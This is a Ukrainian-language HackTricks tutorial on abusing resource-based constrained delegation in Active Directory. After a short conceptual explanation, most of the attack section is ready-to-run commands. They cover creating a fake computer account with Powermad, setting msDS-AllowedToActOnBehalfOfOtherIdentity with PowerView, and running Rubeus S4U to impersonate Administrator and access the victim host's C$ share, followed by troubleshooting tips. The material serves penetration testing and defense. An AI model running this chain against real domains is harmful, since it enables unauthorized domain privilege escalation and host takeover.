# Ресурсна обмежена делегація

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити вашу **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.

</details>

## Основи ресурсної обмеженої делегації

Це схоже на базову [Обмежену делегацію](constrained-delegation.md), але **замість** надання дозволів **об'єкту для втілення будь-якого користувача проти служби**. Ресурсна обмежена делегація **встановлює в об'єкті, хто може втілювати будь-якого користувача проти нього**.

У цьому випадку обмежений об'єкт матиме атрибут під назвою _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ з ім'ям користувача, який може втілювати будь-якого іншого користувача проти нього.

Ще одна важлива відмінність цієї Обмеженої делегації від інших делегацій полягає в тому, що будь-який користувач з **правами запису над обліковим записом машини** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/тощо_) може встановити _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (у інших формах делегації вам потрібні привілеї адміністратора домену).

### Нові концепції

У випадку Обмеженої делегації було сказано, що прапорець **`TrustedToAuthForDelegation`** всередині значення _userAccountControl_ користувача потрібен для виконання **S4U2Self**. Але це не зовсім правда.\
Насправді, навіть без цього значення ви можете виконати **S4U2Self** проти будь-якого користувача, якщо ви є **службою** (маєте SPN), але якщо у вас **є `TrustedToAuthForDelegation`**, повернений TGS буде **Forwardable**, і якщо у вас **немає** цього прапорця, повернений TGS **не буде** **Forwardable**.

Однак, якщо **TGS**, використаний в **S4U2Proxy**, **НЕ є Forwardable**, спроба зловживання **базовою Обмеженою делегацією** **не працюватиме**. Але якщо ви намагаєтеся використати **ресурсно-обмежену делегацію**, це працюватиме (це не вразливість, це, здається, функція).

### Структура атаки

> Якщо у вас є **еквівалентні права запису** над обліковим записом **Комп'ютера**, ви можете отримати **привілегований доступ** до цієї машини.

Припустимо, що зловмисник вже має **еквівалентні права запису над обліковим записом жертви**.

1. Зловмисник **компрометує** обліковий запис, який має **SPN**, або **створює один** ("Служба A"). Зверніть увагу, що **будь-який** _Адміністратор користувач_ без будь-яких інших спеціальних привілеїв може **створити** до 10 **об'єктів Комп'ютера (**_**MachineAccountQuota**_**)** і встановити їм SPN. Таким чином, зловмисник може просто створити об'єкт Комп'ютера та встановити SPN.
2. Зловмисник **зловживлює своїми правами ЗАПИСУ** над обліковим записом жертви (СлужбаB), щоб налаштувати **ресурсно-обмежену делегацію для дозволу СлужбіA втілювати будь-якого користувача** проти цієї облікової записи жертви (СлужбаB).
3. Зловмисник використовує Rubeus для виконання **повної атаки S4U** (S4U2Self та S4U2Proxy) від Служби A до Служби B для користувача **з привілейованим доступом до Служби B**.
1. S4U2Self (від облікового запису, який компрометований/створений): Запитати **TGS Адміністратора для мене** (Не Forwardable).
2. S4U2Proxy: Використовуйте **не Forwardable TGS** з попереднього кроку, щоб запитати **TGS** від **Адміністратора** до **жертви хоста**.
3. Навіть якщо ви використовуєте не Forwardable TGS, оскільки ви експлуатуєте ресурсно-обмежену делегацію, це працюватиме.
4. Зловмисник може **передати квиток** та **втілити** користувача, щоб отримати **доступ до облікового запису жертви B**.

Щоб перевірити _**MachineAccountQuota**_ домену, ви можете використовувати:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Атака

### Створення об'єкта комп'ютера

Ви можете створити об'єкт комп'ютера всередині домену, використовуючи [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Налаштування обмеження делегування на основі ресурсів

**Використання модуля PowerShell для дії в активному каталозі**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Використання powerview**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Виконання повного атаки S4U

Спочатку ми створили новий об'єкт комп'ютера з паролем `123456`, тому нам потрібен хеш цього пароля:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Це виведе хеші RC4 та AES для цього облікового запису.\
Зараз можна виконати атаку:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Ви можете згенерувати більше квитків, просто запитавши один раз, використовуючи параметр `/altservice` у Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Зверніть увагу, що у користувачів є атрибут, який називається "**Не може бути делегованим**". Якщо у користувача цей атрибут встановлено на True, ви не зможете видаавати його. Це властивість можна побачити всередині bloodhound.
{% endhint %}

### Отримання доступу

Остання команда командного рядка виконає **повний атаку S4U та впровадить TGS** від Адміністратора до цільового хоста в **пам'яті**.\
У цьому прикладі було запитано TGS для служби **CIFS** від Адміністратора, тому ви зможете отримати доступ до **C$**:
```bash
ls \\victim.domain.local\C$
```
### Зловживання різними сервісними квитками

Дізнайтеся про [**доступні сервісні квитки тут**](silver-ticket.md#available-services).

## Помилки Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Це означає, що Kerberos налаштований не використовувати DES або RC4, а ви надаєте лише хеш RC4. Постачте Rubeus принаймні хеш AES256 (або просто постачте йому хеші rc4, aes128 та aes256). Приклад: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Це означає, що час поточного комп'ютера відрізняється від часу DC, і Kerberos не працює належним чином.
* **`preauth_failed`**: Це означає, що задане ім'я користувача + хеші не працюють для входу. Можливо, ви забули поставити "$" всередині імені користувача при генерації хешів (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Це може означати:
  * Користувач, якого ви намагаєтеся імітувати, не може отримати доступ до потрібного сервісу (через те, що ви не можете його імітувати або через те, що у нього недостатньо привілеїв)
  * Запитаний сервіс не існує (якщо ви просите квиток для winrm, але winrm не працює)
  * Створений fakecomputer втратив привілеї на вразливому сервері, і вам потрібно повернути їх.

## Посилання

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
